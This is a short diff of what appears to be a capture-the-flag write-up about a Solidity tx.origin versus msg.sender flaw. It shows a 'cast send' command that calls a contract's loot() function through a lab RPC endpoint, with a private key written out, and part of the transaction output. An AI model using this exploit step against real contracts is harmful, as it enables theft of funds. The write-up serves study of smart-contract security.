@@ -114,6 +114,7 @@ tx.origin = Address (our address who called Attacker's contract function)
 msg.sender = Attacker's contract address
 
 We can now loot:
+
     cast send -r http://94.237.61.26:43016/rpc 0x7e5338eeF14Eb414805245253eac7a334504cF98 "loot()" --gas-limit 10000000 --private-key 0x44dbfca44aad713b92d53876ecb4f7465ab494a70a8c073c644892d5a13365b4
     
     blockHash               0x60250c5cee3adec79cb8d7fa65cb730970aa2782d48d001468076cc9e88580dc
